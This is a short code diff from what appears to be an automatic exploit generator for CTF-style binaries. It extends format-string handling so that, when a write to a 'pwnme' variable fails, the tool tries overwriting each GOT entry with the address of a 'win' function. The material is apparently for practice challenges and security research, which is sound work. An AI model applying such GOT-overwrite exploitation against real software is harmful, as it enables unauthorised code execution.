@@ -99,7 +99,17 @@ class Raeg:
             if "pwnme" in self.elf.sym.keys():
                 logger.info("Found a format overwrite with the pwnme variable")
                 self.exploit_function = "pwnme"
-                self.format_write(1337, self.elf.sym['pwnme'])
+                ret = self.format_write(1337, self.elf.sym['pwnme'])
+                if ret == 1:
+                    break
+                else:
+                    for i in self.elf.got.keys():
+                        try:
+                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                            if ret == 1:
+                                break
+                        except:
+                            ret = 0
             elif "win" in self.elf.sym.keys() and "pwnme" not in self.elf.sym.keys():
                 logger.info("Found a win function with a format got overwrite")
                 #print(self.unfilled_got(self.elf.sym["win"], self.last_printf_address))
